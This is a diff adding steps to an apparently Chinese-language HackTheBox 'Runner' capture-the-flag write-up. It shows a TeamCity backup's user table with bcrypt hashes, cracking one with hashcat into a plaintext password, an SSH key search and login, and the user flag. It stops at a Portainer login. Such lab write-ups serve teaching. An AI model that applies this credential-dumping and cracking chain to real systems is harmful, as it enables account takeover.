@@ -556,10 +556,45 @@ curl -H "Authorization: Bearer eyJ0eXAiOiAiVENWMiJ9.UmFYd29SRVlLUzd3RUNIa1Jpem81
 
 是一台teamcity的docker,,,
 
+---
+在teamcity服务器有一个backup功能,我们可以下载这个文件,grep 搜索得到一个账号密码hash
 
+```bash
+ID, USERNAME, PASSWORD, NAME, EMAIL, LAST_LOGIN_TIMESTAMP, ALGORITHM
+1, admin, $2a$07$neV5T/BlEDiMQUs.gM1p4uYl8xl8kvNUo4/8Aja2sAWHAQLWqufye, John, john@runner.htb, 1713754856071, BCRYPT
+2, matthew, $2a$07$q.m8WQP8niXODv55lJVovOmxGtg6K/YPHbD48/JQsdGLulmeVo.Em, Matthew, matthew@runner.htb, 1713750060868, BCRYPT
+11, city_adminzit0, $2a$07$uhiHIIlWAMbr3q9X8tpxruA7v03OX5k7iohHN0apWvAEBfyUttRZu, , angry-admin@funnybunny.org, 1713750320820, BCRYPT
+12, h454nsec8058, $2a$07$hZ9GPUR80DrAP3JYnAi6rujjwotpkSH71tx0H75Dv21WQwzHYlLG6, , "", 1713749135558, BCRYPT
+13, city_admin1bzq, $2a$07$L9YdCjMQ.gseuguV5HmrRuEVewGra0Fznx3oJQUrhxWdjtMY1Trv6, , angry-admin@funnybunny.org, , BCRYPT
+14, city_adminadwl, $2a$07$Yma2SIZwAYSOTN89inPEb.n15cYCYQMEkpXx0hEqQg2Dr8cyWn0JG, , angry-admin@funnybunny.org, 1713754459173, BCRYPT
+15, city_admins1yx, $2a$07$6Ib6KdMJ8TXPELV85WM0euQI9kPNJqwZ8kjFWWEIs0kbvemUz4RHq, , angry-admin@funnybunny.org, , BCRYPT
+16, city_adminkixr, $2a$07$zaG4Wv2MR7B1plCc3y1o.ewQrt6DI0sis0rQUS05.mkxSzsnxOCrq, , angry-admin@funnybunny.org, 1713755037439, BCRYPT
+```
+
+使用hashcat破解
+![image.png](https://gitee.com/leiye87/typora_picture/raw/master/20240422121119.png)
+
+得到`matthew`matthew的密码 `piper123`
+搜索ssh公钥得到 `find -name "*id_rsa*" `得到一个ssh公钥
+
+`ssh -i john@10.10.11.13`成功登录john用户
+得到
+`5e665c01113d93236c4333a879598c27`
 
 #### root
 
+linpeas.sh找到一个反向代理
+![image.png](https://gitee.com/leiye87/typora_picture/raw/master/20240422123253.png)
+
+
+![image.png](https://gitee.com/leiye87/typora_picture/raw/master/20240422123457.png)
+
+使用上面mattrew用户登录上去
+是一个管理docker的网站
+
+> Portainer.io
+> Community Edition
+> 2.19.4
 
 
 ### Jab
